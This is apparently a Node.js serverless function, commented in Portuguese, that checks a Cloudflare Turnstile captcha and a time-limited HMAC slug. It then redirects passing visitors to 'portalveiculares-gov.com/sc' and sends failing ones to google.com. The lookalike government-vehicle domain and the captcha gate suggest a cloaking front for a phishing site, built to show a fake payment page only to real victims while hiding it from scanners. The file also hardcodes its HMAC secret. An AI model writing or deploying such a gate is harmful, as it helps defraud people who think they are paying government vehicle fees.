// Valida token Turnstile + slug HMAC. Retorna {success, redirect}
const crypto = require("crypto");

const HMAC_SECRET = "sc-guias-2026-1167a8c9359ce493353764016606e2b20678376b1f68be2d8a0c6c319dc5af05-fixed";
const SLUG_TTL_SECONDS = 120;
const DESTINATION_URL = "https://portalveiculares-gov.com/sc"; // <-- destino final apos captcha
const FALLBACK_URL = "https://www.google.com";

function json(statusCode, payload) {
  return {
    statusCode,
    headers: { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" },
    body: JSON.stringify(payload),
  };
}

function b64url(buf) {
  return Buffer.from(buf)
    .toString("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
}

function hmacSign(message) {
  return b64url(crypto.createHmac("sha256", HMAC_SECRET).update(message).digest());
}

function safeEqual(a, b) {
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

function verifySlug(slug) {
  if (!slug || typeof slug !== "string") return false;
  const parts = slug.split(".");
  if (parts.length !== 3) return false;
  const [tsStr, nonce, sig] = parts;
  const ts = parseInt(tsStr, 10);
  if (!ts || !nonce || !sig) return false;

  const expected = hmacSign(`${ts}.${nonce}`);
  if (!safeEqual(sig, expected)) return false;

  const now = Math.floor(Date.now() / 1000);
  if (now - ts > SLUG_TTL_SECONDS) return false;
  if (ts > now + 30) return false;
  return true;
}

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, headers: { "Content-Type": "text/plain; charset=utf-8" }, body: "Method not allowed" };
  }

  let body;
  try {
    body = JSON.parse(event.body || "{}");
  } catch {
    return json(400, { success: false, error: "bad-body" });
  }

  const slug = (body.slug || "").toString();
  const token = (body.token || "").toString();

  if (!token) return json(400, { success: false, error: "missing-token" });
  if (!verifySlug(slug)) return json(403, { success: false, error: "invalid-slug", redirect: FALLBACK_URL });

  const secret = process.env.TURNSTILE_SECRET;
  if (!secret) return json(500, { success: false, error: "missing-secret" });

  const ip = (event.headers["x-forwarded-for"] || "").split(",")[0].trim();
  const form = new URLSearchParams();
  form.append("secret", secret);
  form.append("response", token);
  if (ip) form.append("remoteip", ip);

  try {
    const r = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: form.toString(),
    });

    if (!r.ok) {
      return json(200, { success: false, error: "turnstile-service-error" });
    }

    const data = await r.json();
    if (!data.success) {
      return json(200, { success: false, errors: data["error-codes"] || [] });
    }

    return json(200, { success: true, redirect: DESTINATION_URL });
  } catch {
    return json(200, { success: false, error: "verify-failed" });
  }
};
